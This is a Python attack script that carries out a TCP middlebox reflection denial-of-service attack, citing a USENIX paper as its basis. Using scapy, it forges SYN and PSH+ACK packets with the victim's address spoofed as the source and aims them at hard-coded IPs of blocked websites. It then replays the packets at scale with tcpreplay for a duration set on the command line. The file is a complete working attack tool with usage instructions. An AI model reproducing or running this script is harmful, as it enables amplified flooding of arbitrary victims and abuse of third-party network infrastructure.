# simple TCP middlebox reflection attack 1.0, march 2022
# based on https://geneva.cs.umd.edu/papers/usenix-weaponizing-ddos.pdf
# sending pakets through middlebox to forbidden sites, spoofed source IP is the target IP
# 1) send SYN packet, seq s to a forbidden website 
# 2) send ACK+PSH packet, seq s+1, ACK is random, to the same forbidden website 
# the middlebox should return a denial webpage to the target IP, and the target IP a RST response to the middlebox...

#
# sudo python3 tra.py <duration in s> <IP>
# 
#
# ex: sudo python3 mra.py 300 123.4.5.6

import random
import threading
import time
import sys
import random
from scapy.all import *
from scapy.layers.inet import IP, TCP
from multiprocessing import Process, cpu_count
from scapy.utils import rdpcap


# youporn, facebook, pornhub, bittorrent
forbidden_websites = ["66.254.114.79","157.240.13.35","66.254.114.41","98.143.146.7"]

a = "* simple middlebox reflection attack 1.1 *"
print("*"*len(a))
print(a)
print("*"*len(a)+"\n")

def generate(oc, target_ip, nb_pkt_per_thread, i):
    uni_list = []
    
    for _ in range(int(nb_pkt_per_thread/2)):
        a=[]
        
        # forging SYN packet, seq s
        for _ in range(oc):
            
            dst_ip = random.choice(forbidden_websites)
            ip = IP( src=target_ip, dst=dst_ip, ttl=255)

            seq=random.randint(1,65535)
            sport=random.randint(1024,65535)
            a.append((dst_ip,ip,seq,sport))
            tcp = TCP(sport=sport, dport=80, seq=seq, flags="S")
            packet = Ether() /ip / tcp
            uni_list.append(packet)

        # forging ACK+PSH packet, seq s+1, ACK is random
        for j in range(oc):
            dst_ip,ip,seq,sport=a[j]
            ip = IP( src=target_ip,dst=dst_ip, ttl=255)
            payload = 'GET / HTTP/1.1\r\nHost: ' + dst_ip + '\r\n\r\n'
            tcp = TCP(sport=sport, dport=80, ack=RandShort(), seq=seq + 1, flags="PA")
            packet = Ether() / ip / tcp / payload
            uni_list.append(packet)
    
    wrpcap(f"{i}.pcap", uni_list)
    

def attack():    
    print(f"sending packets on {conf.iface}...")
    cmd=f"sudo tcpreplay -i {conf.iface} --preload-pcap --loop=9999999999 --mbps=4 --duration={duration} --stats=10 11.pcap"
    os.system(cmd)  
                   
def merging():
    fi=""
    for i in range(nb_cpu):
        fi=fi+f"{i}.pcap "
    print("merging packets")

    cmd=f"mergecap -a {fi} -w 11.pcap"
    os.system(cmd)    

if os.geteuid() != 0:
    print(" You need to have root privileges to run this script.\n    Please try again, this time using 'sudo'. Exiting.")
    exit()

if len(sys.argv) < 3:
    print("USAGE:      sudo python mra.py <duration in second> <IP>")
    print("example:    sudo python mra.py 30 10.10.10.10")
    exit()

oc=100
nb_cpu =cpu_count()
nb_packets = 400
nb_pkt_per_thread = int(nb_packets/nb_cpu)

duration=sys.argv[1]
target_ip = sys.argv[2]
print(f"{nb_cpu} CPU(s) forging {int(nb_packets*oc/2)} random SYN, ACK+PSH packets...") 
process=[(Process(target=generate, args=(oc,target_ip,nb_pkt_per_thread,i))) for i in range(nb_cpu)]
t=time.time()
for p in process:
    p.start() 
for p in process:
    p.join()
    
merging()
attack()


exit()
  
        

